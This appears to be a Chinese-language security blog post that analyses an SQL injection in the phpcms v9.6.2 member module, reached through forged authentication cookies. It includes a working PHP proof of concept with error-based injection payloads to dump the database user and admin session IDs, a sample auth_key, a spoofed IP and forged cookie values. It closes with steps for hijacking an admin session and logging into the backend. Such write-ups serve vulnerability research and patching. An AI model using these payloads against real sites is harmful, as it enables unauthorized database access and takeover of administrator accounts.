phpcms v9.6.2 再次同时爆出sqli注入漏洞和一个任意文件读取漏洞， 继续分析一波。 

这次sqli注入漏洞还是在member模块， 在会员前台管理中心接口的继承父类foreground:

```php
class index extends foreground {

	private $times_db;
	
	function __construct() {
		parent::__construct();
		$this->http_user_agent = $_SERVER['HTTP_USER_AGENT'];
	}
```

在index类的构造方法中调用了父类的构造方法，我们跟进继承父类的构造方法`/phpcms/modules/member/classes/foreground.class.php` line 19-38：

```php
class foreground {
	public $db, $memberinfo;
	private $_member_modelinfo;
	
	public function __construct() {
		self::check_ip();
		$this->db = pc_base::load_model('member_model');
		//ajax验证信息不需要登录
		if(substr(ROUTE_A, 0, 7) != 'public_') {
			self::check_member();
		}
	}
	
	/**
	 * 判断用户是否已经登陆
	 */
	final public function check_member() {
		$phpcms_auth = param::get_cookie('auth');
		if(ROUTE_M =='member' && ROUTE_C =='index' && in_array(ROUTE_A, array('login', 'register', 'mini','send_newmail'))) {
			if ($phpcms_auth && ROUTE_A != 'mini') {
				showmessage(L('login_success', '', 'member'), 'index.php?m=member&c=index');
			} else {
				return true;
			}
		} else {
			//判断是否存在auth cookie
			if ($phpcms_auth) {
				$auth_key = $auth_key = get_auth_key('login');
				list($userid, $password) = explode("\t", sys_auth($phpcms_auth, 'DECODE', $auth_key));
				//验证用户，获取用户信息
				$this->memberinfo = $this->db->get_one(array('userid'=>$userid));
```

只要不是ajax登录都需要进入check_member验证信息， 在check_member()函数中导致sql注入地方:

```php
$phpcms_auth = param::get_cookie('auth');
...
list($userid, $password) = explode("\t", sys_auth($phpcms_auth, 'DECODE', $auth_key));
//验证用户，获取用户信息
$this->memberinfo = $this->db->get_one(array('userid'=>$userid));
```

$userid 的值是从cookie中获取，然后经过两次解密后的结果，之后程序没有过滤参数直接传入get_one 拼接字符串， 最终导致注入产生。

那么这两次解密过程都经过了什么，我们来分析一下。

首先是param::get_cookie()函数从cookie获加密值并解密,在`/phpcms/libs/classes/param.class.php` LINE 107-116

```php
public static function get_cookie($var, $default = '') {
	$var = pc_base::load_config('system','cookie_pre').$var;
	$value = isset($_COOKIE[$var]) ? sys_auth($_COOKIE[$var], 'DECODE') : $default;
	if(in_array($var,array('_userid','userid','siteid','_groupid','_roleid'))) {
		$value = intval($value);
	} elseif(in_array($var,array('_username','username','_nickname','admin_username','sys_lang'))) { //  site_model auth
		$value = safe_replace($value);
	}
	return $value;
}
```

这里还有一个cookie_pre, 在system.php中设置着，然后调用sys_auth函数解密，没有传入key值默认用配置文件中的auth_key作为解密密钥。

程序继续运行，走到第二个解密的地方:

```php
if ($phpcms_auth) {
	$auth_key = $auth_key = get_auth_key('login');
	list($userid, $password) = explode("\t", sys_auth($phpcms_auth, 'DECODE', $auth_key));
```

sys_auth 传入了第三个参数$auth_key 作为密钥， 而$auth_key 又是通过get_auth_key函数获得，跟进函数:

```php
function get_auth_key($prefix,$suffix="") {
	if($prefix=='login'){
		$pc_auth_key = md5(pc_base::load_config('system','auth_key').ip());
	}else if($prefix=='email'){
		$pc_auth_key = md5(pc_base::load_config('system','auth_key'));
	}else{
		$pc_auth_key = md5(pc_base::load_config('system','auth_key').$suffix);
	}
	$authkey = md5($prefix.$pc_auth_key);
	echo $authkey;
//	exit();
	return $authkey;
}
```
$prefix是login,我们看第一个分支即可，$pc_auth_key 是配置文件的密钥和ip()连接后的md5值，然后$prefix和$pc_auth_key连接在做md5才得到$auth_key 第二次解密的密钥。

ip()函数我们是可以伪造的，来看其定义:
```php
function ip() {
	if(getenv('HTTP_CLIENT_IP') && strcasecmp(getenv('HTTP_CLIENT_IP'), 'unknown')) {
		$ip = getenv('HTTP_CLIENT_IP');
	} elseif(getenv('HTTP_X_FORWARDED_FOR') && strcasecmp(getenv('HTTP_X_FORWARDED_FOR'), 'unknown')) {
		$ip = getenv('HTTP_X_FORWARDED_FOR');
	} elseif(getenv('REMOTE_ADDR') && strcasecmp(getenv('REMOTE_ADDR'), 'unknown')) {
		$ip = getenv('REMOTE_ADDR');
	} elseif(isset($_SERVER['REMOTE_ADDR']) && $_SERVER['REMOTE_ADDR'] && strcasecmp($_SERVER['REMOTE_ADDR'], 'unknown')) {
		$ip = $_SERVER['REMOTE_ADDR'];
	}
	return preg_match ( '/[\d\.]{7,15}/', $ip, $matches ) ? $matches [0] : '';
}
```

那么配置文件中的auth_key 该如何获取呢？ 我们可以通过v9.6.2任意文件读取漏洞去去读取`caches/configs/system.php` 来获得


这样，解密的key都是可控后，我们就可以伪造任意cookie进行注入了, 上poc:

```php
<?php
/**
* 字符串加密、解密函数
*
*
* @param    string    $txt        字符串
* @param    string    $operation    ENCODE为加密，DECODE为解密，可选参数，默认为ENCODE，
* @param    string    $key        密钥：数字、字母、下划线
* @param    string    $expiry        过期时间
* @return    string
*/
function sys_auth($string, $operation = 'ENCODE', $key = '', $expiry = 0) {
    $ckey_length = 4;
    $key = md5($key != '' ? $key : "4sUeVkLdmNZYGu2bPshg");
    $keya = md5(substr($key, 0, 16));
    $keyb = md5(substr($key, 16, 16));
    $keyc = $ckey_length ? ($operation == 'DECODE' ? substr($string, 0, $ckey_length): substr(md5(microtime()), -$ckey_length)) : '';

    $cryptkey = $keya.md5($keya.$keyc);
    $key_length = strlen($cryptkey);

    $string = $operation == 'DECODE' ? base64_decode(strtr(substr($string, $ckey_length), '-_', '+/')) : sprintf('%010d', $expiry ? $expiry + time() : 0).substr(md5($string.$keyb), 0, 16).$string;
    $string_length = strlen($string);

    $result = '';
    $box = range(0, 255);

    $rndkey = array();
    for($i = 0; $i <= 255; $i++) {
        $rndkey[$i] = ord($cryptkey[$i % $key_length]);
    }

    for($j = $i = 0; $i < 256; $i++) {
        $j = ($j + $box[$i] + $rndkey[$i]) % 256;
        $tmp = $box[$i];
        $box[$i] = $box[$j];
        $box[$j] = $tmp;
    }

    for($a = $j = $i = 0; $i < $string_length; $i++) {
        $a = ($a + 1) % 256;
        $j = ($j + $box[$a]) % 256;
        $tmp = $box[$a];
        $box[$a] = $box[$j];
        $box[$j] = $tmp;
        $result .= chr(ord($string[$i]) ^ ($box[($box[$a] + $box[$j]) % 256]));
    }

    if($operation == 'DECODE') {
        if((substr($result, 0, 10) == 0 || substr($result, 0, 10) - time() > 0) && substr($result, 10, 16) == substr(md5(substr($result, 26).$keyb), 0, 16)) {
            return substr($result, 26);
        } else {
            return '';
        }
    } else {
        return $keyc.rtrim(strtr(base64_encode($result), '+/', '-_'), '=');
    }
}

$auth_key = "wR67aGYF4kOghES5NKG1";
$ip = "123.59.214.3";
function get_auth_key($prefix,$suffix="") {
    global $auth_key;
    global $ip;
    if($prefix=='login'){
        $pc_auth_key = md5($auth_key.$ip);
    }else if($prefix=='email'){
        $pc_auth_key = md5($auth_key);
    }else{
        $pc_auth_key = md5($auth_key.$suffix);
    }
    $authkey = md5($prefix.$pc_auth_key);
    return $authkey;
}

$auth_key2 = get_auth_key('login');
$auth_key2 = get_auth_key('login');
$sql = "1' and (extractvalue(1,concat(0x7e,(select user()))));#\txx";
#$sql = "1' and (extractvalue(1,concat(0x7e,(select sessionid from v9_session))));#\tokee";
$sql = sys_auth($sql,'ENCODE',$auth_key2);
echo sys_auth($sql,'ENCODE',$auth_key);

echo "\n";
echo sys_auth('1','ENCODE',$auth_key);

echo sys_auth('3d1bj3Vdx7JEQ6XakmlhBiUiEYBo7Ff3XMV2qrSu','DECODE',$auth_key);
```
![image.png](http://upload-images.jianshu.io/upload_images/2159605-561fec2c0556789c.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240)

之后爆帐号密码也是一样的，将paylaod改成`select xx from v9_admin` 即可，但如果需要解密的话还需要salt,就在v9_admin表中enctypt字段,phpcms密码生成函数为:

```
function password($password, $encrypt='') {
	$pwd = array();
	$pwd['encrypt'] =  $encrypt ? $encrypt : create_randomstr();
	$pwd['password'] = md5(md5(trim($password)).$pwd['encrypt']);
	return $encrypt ? $pwd['password'] : $pwd;
}
```

这种加密在discuz,dede都采用同样的加密。让破解难度大大增加。


如果获取了salt还是无法解密的话，还可以通过注入获取到session值来伪造访问后台页面（dede,discuz也都一样),具体配置在system.php中：


```php
<?php
return array(
//网站路径
'web_path' => '/phpcmsv961/',
//Session配置
'session_storage' => 'mysql',
'session_ttl' => 1800,
'session_savepath' => CACHE_PATH.'sessions/',
'session_n' => 0,
//Cookie配置
'cookie_domain' => '', //Cookie 作用域
'cookie_path' => '', //Cookie 作用路径
'cookie_pre' => 'qErKa_', //Cookie 前缀，同一域名下安装多套系统时，请修改Cookie前缀
'cookie_ttl' => 0, //Cookie 生命周期，0 表示随浏览器进程
```
mysql存储方式，session有效期为30分钟。

我们把poc里面的$sql换成第二条爆session的语句即可.


![image.png](http://upload-images.jianshu.io/upload_images/2159605-40d52b908fb4d508.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240)


之后就是伪造session登录后台了


![image.png](http://upload-images.jianshu.io/upload_images/2159605-a76f861429157046.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240)

这里cookie中还需要另外两个内容:

```
PHPSESSID=7614jvu7e2hp7uemoioldco8c3;  zxtgv_siteid=75614CKDLhilVlQxGX06IK1FTqZnV7Hhs1c4Po34; zxtgv_userid=3d1bj3Vdx7JEQ6XakmlhBiUiEYBo7Ff3XMV2qrSu;
```

siteid和userid都设为1, 然后用auth_key加密下即可得到。

